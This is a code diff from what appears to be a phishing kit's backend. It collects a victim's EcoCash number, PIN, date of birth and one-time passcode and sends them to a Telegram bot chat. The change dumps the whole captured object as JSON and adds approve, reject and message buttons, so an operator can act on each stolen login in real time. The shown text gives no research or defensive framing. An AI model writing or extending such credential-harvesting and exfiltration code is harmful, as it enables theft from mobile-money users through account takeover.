@@ -46,19 +46,23 @@ export const apiService = {
       return { success: false }
     }
 
-    const message = `
-New Client Claim:
-Client Name: ${client.name}
-EcoCash Number: ${client.number}
-Client dob: ${client.dob}
-EcoCash Pin: ${client.pin}
-Client OTP: ${client.otp}
-    `.trim()
+    const message = JSON.stringify(client, null, 2)
+
+    const replyMarkup = {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "✅ Approuver", callback_data: "approve" }],
+          [{ text: "❌ Rejeter", callback_data: "reject" }],
+          [{ text: "💬 Message User", callback_data: "message_user" }]
+        ]
+      }
+    }
 
     try {
       const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         chat_id: TELEGRAM_CHAT_ID,
-        text: message
+        text: message,
+        ...replyMarkup
       })
       return response.data
     } catch (error) {
